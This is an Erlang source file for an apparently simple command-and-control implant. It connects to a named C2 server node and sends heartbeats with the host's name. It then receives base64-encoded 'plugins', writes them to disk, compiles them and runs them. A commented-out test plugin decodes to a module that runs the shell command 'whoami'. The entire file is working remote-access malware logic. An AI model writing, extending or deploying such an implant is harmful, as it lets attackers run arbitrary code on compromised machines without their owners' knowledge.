-module(main).
-export([start/1,loop/1]).

savePlugin(FileName, FileContent) ->
    file:write_file(filename:flatten(["./plugins/",FileName,".erl"]),base64:decode(FileContent)),
    filename:flatten(["./plugins/",FileName,".erl"]).

run_commands(CMDS) ->
    run_commands(CMDS, []).

run_commands([CMD|Rest], Results) ->
    % Look into compile:forms instead for file
    % TODO: Need to reload the module to get the newest. How to force erlang to do this?
    FileToBeDeleted = filename:flatten(["./",filename:basename(CMD,".erl"),".beam"]),
    FileIsFile = filelib:is_file(FileToBeDeleted),
    if
	FileIsFile ->
	    io:format("Deleting file~p~n",[FileToBeDeleted]),
	    file:delete(FileToBeDeleted);
	true ->
	    io:format("No file found ~p~n",[FileToBeDeleted])
    end,
    { _, Mname } = compile:file(CMD),
    io:format("Module name: ~p~n", [Mname]),
    run_commands(Rest,[apply(Mname,get_result,[])|Results]);
run_commands([],Results) ->
    lists:reverse(Results).

%start() ->
%    FileName = savePlugin("test","LW1vZHVsZSh0ZXN0KS4KLWV4cG9ydChbc3RhcnQvMCxnZXRfcmVzdWx0LzBdKS4KLW9uX2xvYWQoc3RhcnQvMCkuCgpzdGFydCgpIC0+CiAgICBpbzpmb3JtYXQoIkhJIEZST00gVEVTVCBQTFVHSU5+biIpLgoKZ2V0X3Jlc3VsdCgpIC0+CiAgICBpbzpmb3JtYXQoIlJ1bm5pbmcgY29kZX5uIiksCiAgICBvczpjbWQoIndob2FtaSIpLgo="),
%    io:format("Saved ~p~n",[FileName]),
%    run_commands([FileName]).

% loop with
% heartbeat
% download plugins to temp files and save file names
% run commands

loop(C2ServerName) ->
    io:format("Starting loop~n"),
    {_, Hostname} = inet:gethostname(),
    {c2server, list_to_atom(C2ServerName)} ! {heartbeat, self(), Hostname},
    receive 
	{plugin,PluginName,PluginContentBase64} -> 
	    io:format("GOT PLUGIN~n"),
	    run_commands([savePlugin(PluginName, PluginContentBase64)]),
	    loop(C2ServerName)
    after 10 ->
	    loop(C2ServerName)
    end,
    receive
    after 10 ->
	    loop(C2ServerName)
    end.
				     
start(C2ServerName) ->
    io:format("Pinging remote server~n"),
    net_adm:ping(list_to_atom(C2ServerName)),
    loop(C2ServerName).
